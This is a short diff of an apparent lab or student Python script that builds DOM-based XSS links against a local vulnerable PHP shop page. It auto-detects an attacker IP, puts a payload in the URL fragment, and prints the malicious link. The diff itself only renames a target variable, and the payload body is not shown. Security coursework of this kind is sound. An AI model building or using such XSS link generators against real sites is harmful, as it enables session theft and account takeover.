@@ -18,9 +18,9 @@ def detect_lan_ip():
         s.close()
 
 
-TARGET_IP = "localhost"
+VULNERABLE_SITE_IP = "localhost"
 ATTACKER_IP = detect_lan_ip() or input("Could not auto-detect LAN IP. Enter attacker IP: ").strip()
-TARGET_URL = f"http://{TARGET_IP}/CyberProject/product_view.php?id=1"
+TARGET_URL = f"http://{VULNERABLE_SITE_IP}/CyberProject/product_view.php?id=1"
 
 
 payload = (
@@ -34,7 +34,7 @@ malicious_link = f"{TARGET_URL}#{payload}"
 encoded_link   = f"{TARGET_URL}#{urllib.parse.quote(payload, safe='')}"
 
 print("=" * 60)
-print(f"[!] DOM XSS Payload Generated (Target: {TARGET_IP})")
+print(f"[!] DOM XSS Payload Generated (Target: {VULNERABLE_SITE_IP})")
 print("=" * 60)
 
 print("\n--- Raw URL ---\n")
